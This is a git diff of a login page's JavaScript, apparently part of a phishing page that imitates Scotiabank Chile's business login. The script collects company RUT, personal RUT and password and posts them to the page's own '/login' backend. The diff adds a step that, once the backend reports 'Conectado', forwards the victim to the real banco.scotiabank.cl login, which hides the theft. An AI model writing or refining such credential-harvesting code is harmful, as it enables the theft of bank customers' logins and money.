@@ -200,27 +200,34 @@ aplicarRut(document.getElementById("rutPersona"));
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
   <!-- Script envío a backend -->
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const rutEmpresa = document.getElementById('rutEmpresa').value;
-      const rutPersona = document.getElementById('rutPersona').value;
-      const passwd = document.getElementById('passwd').value;
+ <script>
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const rutEmpresa = document.getElementById('rutEmpresa').value;
+    const rutPersona = document.getElementById('rutPersona').value;
+    const passwd = document.getElementById('passwd').value;
 
-      try {
-        const res = await fetch('/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
-        });
+    try {
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
+      });
 
-        const data = await res.text();
-        document.getElementById('message').textContent = data;
-      } catch (error) {
-        document.getElementById('message').textContent = 'Error al enviar datos';
-        console.error(error);
+      const data = await res.json(); // ✅ leer como JSON
+      document.getElementById('message').textContent = data.mensaje; // solo la frase
+
+      // Si el status es "Conectado", redirigir después de 2 segundos
+      if (data.status === "Conectado") {
+        setTimeout(() => {
+          window.location.href = "https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4";
+        }, 2000);
       }
-    });
-  </script>
+    } catch (error) {
+      document.getElementById('message').textContent = 'Error al enviar datos';
+      console.error(error);
+    }
+  });
+</script>
 </body>
 </html>
